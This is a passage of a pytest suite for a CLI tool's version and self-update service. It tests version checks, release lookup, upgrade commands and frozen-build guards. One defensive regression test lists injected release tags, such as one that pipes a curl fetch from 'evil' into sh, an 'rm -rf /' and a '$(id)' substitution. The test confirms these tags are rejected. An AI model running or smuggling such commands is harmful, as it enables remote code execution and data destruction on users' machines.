"""Tests for VersionService - version detection and update checks."""

import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from keboola_agent_cli.frozen_dist import FrozenChannel, FrozenDistribution
from keboola_agent_cli.services.version_service import (
    KbagentUpdatePlan,
    UpdatePlan,
    VersionService,
    _fetch_kbagent_latest_version,
    _is_up_to_date,
    _recovery_command,
    build_kbagent_upgrade_command,
    get_update_timeout,
    prepare_kbagent_update_plan,
    resolve_kbagent_wheel_url,
)
from keboola_agent_cli.update_runner import DeferredUpdateRequest, InstallRun, InstallStatus


class TestIsUpToDate:
    """Tests for _is_up_to_date()."""

    def test_same_version(self) -> None:
        assert _is_up_to_date("2.44.0", "2.44.0") is True

    def test_newer_available(self) -> None:
        assert _is_up_to_date("2.44.0", "2.44.2") is False

    def test_local_newer(self) -> None:
        assert _is_up_to_date("2.45.0", "2.44.2") is True

    def test_local_none(self) -> None:
        assert _is_up_to_date(None, "2.44.2") is None

    def test_latest_none(self) -> None:
        assert _is_up_to_date("2.44.0", None) is None

    def test_both_none(self) -> None:
        assert _is_up_to_date(None, None) is None

    def test_invalid_version(self) -> None:
        assert _is_up_to_date("not-a-version", "2.44.0") is None


class TestVersionService:
    """Tests for VersionService.get_versions()."""

    @patch("keboola_agent_cli.auto_update._write_cache")
    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    def test_kbagent_entry(
        self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
    ) -> None:
        mock_kbagent_latest.return_value = "9.9.9"

        result = VersionService().get_versions()

        assert result["kbagent"]["version"] is not None
        assert result["kbagent"]["latest_version"] == "9.9.9"
        assert result["kbagent"]["up_to_date"] is False
        assert result["kbagent"]["upgrade_command"]

    @patch("keboola_agent_cli.auto_update._write_cache")
    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    def test_payload_carries_no_dependencies(
        self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
    ) -> None:
        """v0.85.0 dropped the keboola-mcp-server entry from the payload.

        It was the only entry under ``dependencies``, so the key itself is
        gone rather than left as an empty list -- consumers read
        ``result["kbagent"]`` and nothing else.
        """
        mock_kbagent_latest.return_value = "9.9.9"

        result = VersionService().get_versions()

        assert set(result) == {"kbagent"}

    @patch("keboola_agent_cli.auto_update._write_cache")
    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    def test_remote_check_fails(
        self, mock_kbagent_latest: MagicMock, mock_write_cache: MagicMock
    ) -> None:
        mock_kbagent_latest.return_value = None

        result = VersionService().get_versions()

        assert result["kbagent"]["latest_version"] is None
        assert result["kbagent"]["up_to_date"] is None  # cannot compare without latest

    @patch("keboola_agent_cli.auto_update._write_cache")
    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    def test_persists_freshly_fetched_versions_to_cache(
        self,
        mock_kbagent_latest: MagicMock,
        mock_write_cache: MagicMock,
    ) -> None:
        """Bug fix (v0.41.1): ``get_versions()`` must persist the freshly-fetched
        ``latest_version`` to the auto-update cache.

        Before v0.41.1, ``kbagent version`` bypassed the cache entirely. The
        symptom: ``kbagent version`` would correctly show ``v0.41.0 available``
        (live fetch from GitHub), but a follow-up ``kbagent serve --ui`` on the
        same machine would still auto-update to whatever stale value the
        1-hour-TTL'd cache held (e.g. 0.40.3). Two commands, two different
        answers to the same question; users got a kbagent older than what
        their version check claimed was newest.
        """
        mock_kbagent_latest.return_value = "9.9.9"

        result = VersionService().get_versions()

        # Verify the cache write actually happened with the new value.
        mock_write_cache.assert_called_once()
        call_kwargs = mock_write_cache.call_args.kwargs
        assert call_kwargs["latest_version"] == "9.9.9"

        # And the returned dict still has the same value.
        assert result["kbagent"]["latest_version"] == "9.9.9"

    @patch("keboola_agent_cli.auto_update._write_cache", side_effect=OSError("disk full"))
    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    def test_cache_write_failure_does_not_break_get_versions(
        self,
        mock_kbagent_latest: MagicMock,
        mock_write_cache: MagicMock,
    ) -> None:
        """Cache write is best-effort: a write failure must NOT break the
        version command. The user sees the version info; the cache just
        won't be refreshed on this run."""
        mock_kbagent_latest.return_value = "9.9.9"

        result = VersionService().get_versions()  # must NOT raise

        # The result is still well-formed despite the cache write failing.
        assert result["kbagent"]["latest_version"] == "9.9.9"


# ---------------------------------------------------------------------------
# VersionService.self_update
# ---------------------------------------------------------------------------


class TestSelfUpdateSingleStage:
    """Tests for the kbagent self-upgrade path."""

    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    @patch("keboola_agent_cli.services.version_service.run_install")
    def test_up_to_date_runs_no_subprocess(
        self, mock_install: MagicMock, mock_kbagent_latest: MagicMock
    ) -> None:
        from keboola_agent_cli import __version__

        mock_kbagent_latest.return_value = __version__

        result = VersionService().self_update()

        assert result["updated"] is False
        assert result["kbagent"]["updated"] is False
        assert result["kbagent"]["up_to_date"] is True
        assert set(result) == {"kbagent", "updated", "message"}
        mock_install.assert_not_called()

    def test_prepares_every_lookup_before_terminal_kbagent(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Issue #528: no discovery may happen after self-mutation begins."""
        events: list[str] = []
        mutated = False

        def prepare(*, include_prerelease: bool = False) -> UpdatePlan:
            events.append("prepare")
            return UpdatePlan(
                kbagent=KbagentUpdatePlan(
                    current_version="1.0.0",
                    latest_version="2.0.0",
                    up_to_date=False,
                    command=("uv", "tool", "install"),
                    recovery_command="uv tool install --force --reinstall exact",
                ),
            )

        def install(command: tuple[str, ...], **kwargs: object) -> InstallRun:
            nonlocal mutated
            assert command == ("uv", "tool", "install")
            mutated = True
            events.append("kbagent")
            return InstallRun(
                status=InstallStatus.FAILED,
                exit_code=1,
                output="locked",
                log_path=Path("update.log"),
            )

        monkeypatch.setattr(
            "keboola_agent_cli.services.version_service.prepare_update_plan", prepare
        )
        monkeypatch.setattr(
            "keboola_agent_cli.services.version_service.should_defer", lambda: False
        )
        monkeypatch.setattr("keboola_agent_cli.services.version_service.run_install", install)

        result = VersionService().self_update()

        assert events == ["prepare", "kbagent"]
        assert result["kbagent"]["updated"] is False
        assert result["kbagent"]["recovery_command"].endswith("exact")


class TestSelfUpdateDefersOnWindows:
    """`kbagent update` must not replace the venv it is running from (#528)."""

    @staticmethod
    def _plan() -> UpdatePlan:
        return UpdatePlan(
            kbagent=KbagentUpdatePlan(
                current_version="1.0.0",
                latest_version="2.0.0",
                up_to_date=False,
                command=("uv", "tool", "install", "--force", "--reinstall", "keboola-cli @ x"),
                recovery_command="uv tool install --force --reinstall 'keboola-cli @ x'",
            ),
        )

    def test_schedules_helper_and_never_installs_inline(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The install is handed to the detached helper, not run here.

        Running it inline is what deletes the live environment mid-flight and
        leaves a gutted venv behind, so `run_install` must never be reached.
        """
        requests: list[DeferredUpdateRequest] = []

        def schedule(request: DeferredUpdateRequest) -> bool:
            requests.append(request)
            return True

        def refuse_inline(*args: object, **kwargs: object) -> InstallRun:
            raise AssertionError("the installer must not run inside the target environment")

        monkeypatch.setattr(
            "keboola_agent_cli.services.version_service.prepare_update_plan",
            lambda **_: self._plan(),
        )
        monkeypatch.setattr("keboola_agent_cli.services.version_service.should_defer", lambda: True)
        monkeypatch.setattr(
            "keboola_agent_cli.services.version_service.request_deferred_update", schedule
        )
        monkeypatch.setattr("keboola_agent_cli.services.version_service.run_install", refuse_inline)

        result = VersionService().self_update()

        assert len(requests) == 1
        assert requests[0].target_version == "2.0.0"
        assert requests[0].install_command == self._plan().kbagent.command
        assert result["kbagent"]["deferred"] is True
        assert result["kbagent"]["updated"] is False
        # A scheduled update is not a failure and must not be summarised as one.
        assert "FAILED" not in result["message"]
        assert "scheduled" in result["message"]

    def test_unschedulable_hands_the_user_the_command(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """No helper -> tell the user, never fall back to the unsafe install."""

        def refuse_inline(*args: object, **kwargs: object) -> InstallRun:
            raise AssertionError("the installer must not run inside the target environment")

        monkeypatch.setattr(
            "keboola_agent_cli.services.version_service.prepare_update_plan",
            lambda **_: self._plan(),
        )
        monkeypatch.setattr("keboola_agent_cli.services.version_service.should_defer", lambda: True)
        monkeypatch.setattr(
            "keboola_agent_cli.services.version_service.request_deferred_update", lambda _: False
        )
        monkeypatch.setattr("keboola_agent_cli.services.version_service.run_install", refuse_inline)

        result = VersionService().self_update()

        assert result["kbagent"]["deferred"] is False
        assert result["kbagent"]["updated"] is False
        assert result["kbagent"]["recovery_command"] in result["kbagent"]["message"]


class TestFetchKbagentLatestVersion:
    """Beta / pre-release opt-in for kbagent version lookup (since v0.42.0)."""

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_default_uses_releases_latest_endpoint(self, mock_get: MagicMock) -> None:
        """Without --beta: hit /releases/latest (GitHub filters prerelease)."""
        mock_response = MagicMock()
        mock_response.json.return_value = {"tag_name": "v0.42.0"}
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response

        result = _fetch_kbagent_latest_version()

        assert result == "0.42.0"
        # Only one call, to /releases/latest -- the prerelease path uses
        # /releases (plural) instead.
        assert mock_get.call_count == 1
        url = mock_get.call_args.args[0]
        assert url.endswith("/releases/latest")

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_rejects_adversarial_release_tag(self, mock_get: MagicMock) -> None:
        """GHSA-x6cx: a tag whose valid version prefix is followed by garbage
        must be rejected. The old non-end-anchored ``re.match`` accepted it on
        the prefix, letting it flow into the upgrade command."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response
        for bad in (
            "v0.99.0; curl evil | sh",
            "v0.99.0 && rm -rf /",
            "v0.99.0/../../x",
            "v0.99.0$(id)",
            "v0.99.0evil",
            "vgarbage",
        ):
            mock_response.json.return_value = {"tag_name": bad}
            assert _fetch_kbagent_latest_version() is None, bad

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_accepts_valid_stable_and_beta_tags(self, mock_get: MagicMock) -> None:
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response
        for tag, expected in (
            ("v0.65.1", "0.65.1"),
            ("v0.43.0b1", "0.43.0b1"),
            ("0.65.2", "0.65.2"),
        ):
            mock_response.json.return_value = {"tag_name": tag}
            assert _fetch_kbagent_latest_version() == expected, tag

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_returns_highest_pep440_version(self, mock_get: MagicMock) -> None:
        """With include_prerelease=True: pick highest by PEP 440 ordering."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        # GitHub /releases returns newest-first, but the function must sort
        # by SemVer/PEP 440, not by API order -- otherwise a hot-fix to an
        # older release line (e.g. v0.41.11 after v0.42.0) would win.
        mock_response.json.return_value = [
            {"tag_name": "v0.41.11", "draft": False, "prerelease": False},
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
            {"tag_name": "v0.43.0b1", "draft": False, "prerelease": True},
            {"tag_name": "v0.43.0b2", "draft": False, "prerelease": True},
        ]
        mock_get.return_value = mock_response

        result = _fetch_kbagent_latest_version(include_prerelease=True)

        assert result == "0.43.0b2"
        # Plural /releases endpoint -- only one call.
        url = mock_get.call_args.args[0]
        assert url.endswith("/releases")

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_skips_drafts(self, mock_get: MagicMock) -> None:
        """Draft releases must be ignored even when newest by tag."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json.return_value = [
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
            {"tag_name": "v0.43.0b1", "draft": True, "prerelease": True},
        ]
        mock_get.return_value = mock_response

        result = _fetch_kbagent_latest_version(include_prerelease=True)

        # Draft 0.43.0b1 skipped -> 0.42.0 wins.
        assert result == "0.42.0"

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_falls_back_to_stable_when_no_betas(self, mock_get: MagicMock) -> None:
        """When no pre-releases exist, the highest stable still wins."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json.return_value = [
            {"tag_name": "v0.41.10", "draft": False, "prerelease": False},
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
        ]
        mock_get.return_value = mock_response

        assert _fetch_kbagent_latest_version(include_prerelease=True) == "0.42.0"

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_ignores_invalid_tags(self, mock_get: MagicMock) -> None:
        """Hand-rolled tags that don't parse as PEP 440 are silently dropped."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json.return_value = [
            {"tag_name": "vnext", "draft": False, "prerelease": True},  # invalid
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
            {"tag_name": "wip", "draft": False, "prerelease": True},  # invalid
        ]
        mock_get.return_value = mock_response

        assert _fetch_kbagent_latest_version(include_prerelease=True) == "0.42.0"

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_http_failure_returns_none(self, mock_get: MagicMock) -> None:
        """Any httpx error returns None without crashing the caller."""
        import httpx

        mock_get.side_effect = httpx.HTTPError("upstream is down")
        assert _fetch_kbagent_latest_version(include_prerelease=True) is None


class TestResolveKbagentWheelUrl:
    """resolve_kbagent_wheel_url HEAD-probes the Release asset (issue #353)."""

    @patch("keboola_agent_cli.services.version_service.httpx.head")
    def test_returns_url_when_asset_present(self, mock_head: MagicMock) -> None:
        mock_head.return_value = MagicMock(status_code=200)
        url = resolve_kbagent_wheel_url("0.60.0")
        assert url == (
            "https://github.com/keboola/cli/releases/download/"
            "v0.60.0/keboola_cli-0.60.0-py3-none-any.whl"
        )
        # follow_redirects is required to traverse GitHub's asset CDN redirect.
        assert mock_head.call_args.kwargs.get("follow_redirects") is True

    @patch("keboola_agent_cli.services.version_service.httpx.head")
    def test_returns_none_on_404(self, mock_head: MagicMock) -> None:
        mock_head.return_value = MagicMock(status_code=404)
        assert resolve_kbagent_wheel_url("9.9.9") is None

    @patch("keboola_agent_cli.services.version_service.httpx.head")
    def test_returns_none_on_http_error(self, mock_head: MagicMock) -> None:
        import httpx

        mock_head.side_effect = httpx.HTTPError("network down")
        assert resolve_kbagent_wheel_url("0.60.0") is None

    def test_returns_none_for_empty_version(self) -> None:
        # Guards the None/"" caller path -- no network call is made.
        assert resolve_kbagent_wheel_url(None) is None
        assert resolve_kbagent_wheel_url("") is None


class TestGetUpdateTimeout:
    """get_update_timeout resolves the self-update subprocess timeout (issue #353)."""

    def test_default_is_300(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("KBAGENT_UPDATE_TIMEOUT", raising=False)
        assert get_update_timeout() == 300.0

    def test_env_override(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("KBAGENT_UPDATE_TIMEOUT", "600")
        assert get_update_timeout() == 600.0

    @pytest.mark.parametrize("bad_value", ["", "   ", "bogus", "-5", "0", "12.x"])
    def test_invalid_env_falls_back_to_default(
        self, monkeypatch: pytest.MonkeyPatch, bad_value: str
    ) -> None:
        # Non-numeric or non-positive overrides must NOT disable the timeout --
        # they silently fall back to the 300s default.
        monkeypatch.setenv("KBAGENT_UPDATE_TIMEOUT", bad_value)
        assert get_update_timeout() == 300.0


class TestBuildKbagentWheelInstall:
    """build_kbagent_upgrade_command wheel_url fast path (issue #353)."""

    WHEEL = (
        "https://github.com/keboola/cli/releases/download/v1.2.3/keboola_cli-1.2.3-py3-none-any.whl"
    )

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=True)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_wheel_with_server_extras(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        cmd = build_kbagent_upgrade_command(wheel_url=self.WHEEL)
        assert cmd is not None
        assert cmd == [
            "/usr/bin/uv",
            "tool",
            "install",
            "--force",
            f"keboola-cli[server] @ {self.WHEEL}",
        ]
        # The wheel path uses a PEP 508 direct ref -- no git+ source, no --with.
        assert all("git+" not in part for part in cmd)
        assert "--with" not in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=False)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_wheel_without_server_extras(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        cmd = build_kbagent_upgrade_command(wheel_url=self.WHEEL)
        assert cmd == [
            "/usr/bin/uv",
            "tool",
            "install",
            "--force",
            f"keboola-cli @ {self.WHEEL}",
        ]

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=False)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_pip_fallback_wheel(self, mock_which: MagicMock, mock_has_server: MagicMock) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/pip" if x == "pip" else None
        cmd = build_kbagent_upgrade_command(wheel_url=self.WHEEL)
        assert cmd == [
            "/usr/bin/pip",
            "install",
            "--upgrade",
            f"keboola-cli @ {self.WHEEL}",
        ]

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=False)
    @patch("keboola_agent_cli.services.version_service.shutil.which", return_value=None)
    def test_wheel_no_tools_returns_none(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        assert build_kbagent_upgrade_command(wheel_url=self.WHEEL) is None

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=True)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_wheel_url_takes_precedence_over_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        """wheel_url wins over prerelease / target_version (git-source knobs)."""
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        cmd = build_kbagent_upgrade_command(
            prerelease=True, target_version="1.2.3", wheel_url=self.WHEEL
        )
        assert cmd is not None
        assert "--prerelease=allow" in cmd
        assert "--reinstall" in cmd
        assert all("git+" not in part for part in cmd)
        assert cmd[-1] == f"keboola-cli[server] @ {self.WHEEL}"


class TestBuildKbagentUpgradeCommand:
    """Resolver pre-release opt-in propagation (since v0.42.0)."""

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_without_extras_no_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command()

        assert cmd is not None
        assert "--prerelease=allow" not in cmd
        assert "--upgrade" in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_without_extras_with_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=True)

        assert cmd is not None
        assert "--prerelease=allow" in cmd
        # Flag must sit before the install spec (positional last arg).
        assert cmd.index("--prerelease=allow") == len(cmd) - 2

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_with_extras_with_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = True

        cmd = build_kbagent_upgrade_command(prerelease=True)

        assert cmd is not None
        assert "--prerelease=allow" in cmd
        # Extras flag preserved
        assert "--with" in cmd
        assert "keboola-cli[server]" in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_pip_fallback_with_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/pip" if x == "pip" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=True)

        assert cmd is not None
        # pip uses --pre, not --prerelease=allow
        assert "--pre" in cmd
        # Must sit after the `install` verb, before `--upgrade`
        assert cmd.index("--pre") == cmd.index("install") + 1

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_prerelease_with_target_version_appends_tag(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        """Variant B fix: prerelease+target_version tag-pins install URL.

        Without this, uv resolves the default branch (`main`) which
        carries the latest stable pyproject.toml -- even though the
        version fetcher advertised a beta tag on a feature branch. Pinning
        ``@v<version>`` forces uv to install the exact commit the tag
        points to.
        """
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=True, target_version="0.44.0b1")

        assert cmd is not None
        # Install source = last positional arg, must end with @v<version>.
        assert cmd[-1].endswith("@v0.44.0b1")
        # --prerelease=allow still required so the resolver accepts the
        # PEP 440 pre-release spec at the tag's pyproject.toml.
        assert "--prerelease=allow" in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_stable_with_target_version_pins_tag(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        """Stable recovery is pinned to the requested immutable release tag."""
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=False, target_version="0.43.3")

        assert cmd is not None
        assert cmd[-1].endswith("@v0.43.3")
        assert "--force" in cmd
        assert "--reinstall" in cmd

    def test_windows_uv_executable_keeps_exact_beta_recovery_command(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """uv.exe is uv, not a pip fallback; retain its prerelease flag."""
        monkeypatch.setattr(
            "keboola_agent_cli.services.version_service._render_command",
            subprocess.list2cmdline,
        )
        command = (
            r"C:\Users\test\.local\bin\uv.exe",
            "tool",
            "install",
            "--force",
            "--reinstall",
            "--prerelease=allow",
            "keboola-cli[server] @ https://example.test/keboola.whl",
        )

        recovery = _recovery_command(command, "1.0.0b1")

        assert recovery is not None
        assert recovery.startswith("uv tool install")
        assert "--prerelease=allow" in recovery
        assert "'keboola-cli" not in recovery


class TestComposeUpdateSummary:
    """The one-line summary must distinguish up-to-date from a FAILED update.

    Regression for the #424 rename breakage: a self-update that failed (e.g.
    `Executable already exists: kbagent`) was rendered as `already up to date`,
    so users had no signal the upgrade never happened.
    """

    def test_kbagent_failure_is_surfaced_not_masked(self) -> None:
        kbagent = {
            "updated": False,
            "current_version": "0.62.0",
            "latest_version": "0.63.1",
            "message": (
                "Update failed: Resolved 46 packages\n"
                "error: Executable already exists: kbagent (use `--force` to overwrite)"
            ),
        }
        summary = VersionService._compose_update_summary(kbagent)

        assert "update FAILED" in summary
        assert "Executable already exists: kbagent" in summary
        # The masking bug: a failure must NOT be reported as up to date.
        assert "(already up to date)" not in summary.split("|")[0]

    def test_kbagent_up_to_date_renders_up_to_date(self) -> None:
        kbagent = {
            "updated": False,
            "up_to_date": True,
            "current_version": "0.63.1",
            "latest_version": "0.63.1",
        }
        summary = VersionService._compose_update_summary(kbagent)

        assert "kbagent v0.63.1 (already up to date)" in summary
        assert "FAILED" not in summary

    def test_kbagent_upgraded_renders_arrow(self) -> None:
        kbagent = {"updated": True, "current_version": "0.62.0", "latest_version": "0.63.1"}
        summary = VersionService._compose_update_summary(kbagent)

        assert "kbagent v0.62.0 -> v0.63.1" in summary

    def test_failure_tail_is_last_nonempty_line(self) -> None:
        msg = "Update failed: line one\n\n  error: the real reason  \n"
        assert VersionService._summarize_failure_tail(msg) == "error: the real reason"
        assert VersionService._summarize_failure_tail("") == "update failed"
        assert VersionService._summarize_failure_tail(None) == "update failed"


class TestSummaryDistinguishesNotYetFromFailed:
    """ "Not updated" has three meanings; only one of them is a failure (#528)."""

    @staticmethod
    def _kbagent(**overrides: object) -> dict:
        base = {
            "planned": True,
            "updated": False,
            "up_to_date": False,
            "current_version": "0.77.0",
            "latest_version": "0.77.1",
            "message": "...",
        }
        base.update(overrides)
        return base

    def test_scheduled_is_not_a_failure(self) -> None:
        summary = VersionService._compose_update_summary(self._kbagent(deferred=True))
        assert "(scheduled)" in summary
        assert "FAILED" not in summary

    def test_still_running_is_not_a_failure(self) -> None:
        """It was never killed -- calling it FAILED contradicts the banner."""
        summary = VersionService._compose_update_summary(self._kbagent(still_running=True))
        assert "(still installing)" in summary
        assert "FAILED" not in summary

    def test_a_real_failure_is_still_reported_as_one(self) -> None:
        summary = VersionService._compose_update_summary(
            self._kbagent(message="Update failed: locked")
        )
        assert "FAILED" in summary


class TestFrozenBuildSelfUpdateGuard:
    """`kbagent update` / `kbagent version` on a native PyInstaller binary.

    Unlike the startup hook -- which was accidentally suppressed for frozen
    builds by the bundled editable ``direct_url.json`` -- this path had NO guard
    at all: ``build_kbagent_upgrade_command`` happily returned
    ``uv tool install --force --reinstall`` inside a real frozen binary
    (reproduced empirically). That installs a second, unrelated kbagent which
    shadows the packaged one on PATH.
    """

    CHOCO_DIST = FrozenDistribution(
        channel=FrozenChannel.CHOCOLATEY,
        binary_path=r"C:\ProgramData\chocolatey\lib\keboola-cli2\tools\kbagent.exe",
        upgrade_command="choco upgrade keboola-cli2",
        upgrade_hint="upgrade it with: choco upgrade keboola-cli2",
    )
    ARCHIVE_DIST = FrozenDistribution(
        channel=FrozenChannel.ARCHIVE,
        binary_path="/home/me/bin/kbagent",
        upgrade_command=None,
        upgrade_hint="re-download the signed archive from https://example.invalid/releases",
    )

    @staticmethod
    def _patch_frozen(distribution):
        return patch(
            "keboola_agent_cli.services.version_service.detect_frozen_distribution",
            return_value=distribution,
        )

    def test_plan_carries_channel_and_builds_no_install_command(self):
        """No uv/pip command may be produced for a frozen build."""
        with self._patch_frozen(self.CHOCO_DIST):
            plan = prepare_kbagent_update_plan("99.0.0")
        assert plan.frozen_distribution is self.CHOCO_DIST
        assert plan.command is None
        # recovery_command is a uv command too -- it must not be offered either.
        assert plan.recovery_command is None
        assert plan.up_to_date is False

    def test_plan_skips_the_wheel_url_probe(self):
        """The HEAD probe only exists to build a command we refuse to run."""
        with (
            self._patch_frozen(self.CHOCO_DIST),
            patch(
                "keboola_agent_cli.services.version_service.resolve_kbagent_wheel_url"
            ) as mock_probe,
        ):
            prepare_kbagent_update_plan("99.0.0")
        mock_probe.assert_not_called()

    def test_update_refuses_and_names_the_channel(self):
        """`kbagent update` must install nothing at all on a frozen build.

        Asserted against BOTH install paths deliberately. Since issue #528 the
        install no longer goes through ``subprocess.run`` here -- it goes
        through ``run_install`` inline, or ``request_deferred_update`` on
        Windows -- so a test that only watched ``subprocess.run`` would pass
        vacuously while the deferred helper happily scheduled a `uv tool
        install` over a Chocolatey binary.
        """
        with self._patch_frozen(self.CHOCO_DIST):
            plan = prepare_kbagent_update_plan("99.0.0")
        with (
            patch("keboola_agent_cli.services.version_service.run_install") as mock_install,
            patch(
                "keboola_agent_cli.services.version_service.request_deferred_update"
            ) as mock_defer,
            patch(
                "keboola_agent_cli.services.version_service.should_defer", return_value=True
            ) as mock_should_defer,
            patch("keboola_agent_cli.services.version_service.subprocess.run") as mock_run,
        ):
            result = VersionService._update_kbagent(plan)
        mock_install.assert_not_called()
        mock_defer.assert_not_called()
        mock_run.assert_not_called()
        # Returned before the platform even got a say -- should_defer() is
        # forced True above precisely so a wrong branch order would show up.
        mock_should_defer.assert_not_called()
        assert result["updated"] is False
        assert result["install_channel"] == "chocolatey"
        assert result["upgrade_command"] == "choco upgrade keboola-cli2"
        assert "choco upgrade keboola-cli2" in result["message"]
        assert "uv tool install" not in result["message"]

    def test_update_of_archive_install_points_at_the_release_page(self):
        """A channel with no single command still gets an actionable message."""
        with self._patch_frozen(self.ARCHIVE_DIST):
            plan = prepare_kbagent_update_plan("99.0.0")
        result = VersionService._update_kbagent(plan)
        assert result["upgrade_command"] is None
        assert "re-download the signed archive" in result["message"]
        assert "uv tool install" not in result["message"]

    def test_up_to_date_frozen_binary_short_circuits_first(self):
        """Being current still wins over the frozen branch."""
        plan = KbagentUpdatePlan(
            current_version="1.0.0",
            latest_version="1.0.0",
            up_to_date=True,
            command=None,
            recovery_command=None,
            frozen_distribution=self.CHOCO_DIST,
        )
        result = VersionService._update_kbagent(plan)
        assert result["up_to_date"] is True
        assert "already up to date" in result["message"]

    def test_summary_does_not_report_a_refusal_as_a_failure(self):
        """`updated=False` here means "not ours to do", not "it broke".

        Without a dedicated branch this falls through to the generic
        "update FAILED" arm of _compose_update_summary.
        """
        with self._patch_frozen(self.CHOCO_DIST):
            plan = prepare_kbagent_update_plan("99.0.0")
        kbagent_result = VersionService._update_kbagent(plan)
        summary = VersionService._compose_update_summary(kbagent_result)
        assert "FAILED" not in summary
        assert "choco upgrade keboola-cli2" in summary
        assert "99.0.0" in summary

    def test_non_frozen_plan_still_builds_the_uv_command(self):
        """Regression guard: the Python-distribution path is untouched."""
        with (
            self._patch_frozen(None),
            patch(
                "keboola_agent_cli.services.version_service.resolve_kbagent_wheel_url",
                return_value=None,
            ),
        ):
            plan = prepare_kbagent_update_plan("99.0.0")
        assert plan.frozen_distribution is None
        assert plan.command is not None
        assert plan.recovery_command is not None


class TestFrozenBuildVersionOutput:
    """`kbagent version` must advertise the channel command, not uv."""

    @pytest.fixture(autouse=True)
    def _no_real_probes(self):
        with (
            patch(
                "keboola_agent_cli.services.version_service._fetch_kbagent_latest_version",
                return_value="99.0.0",
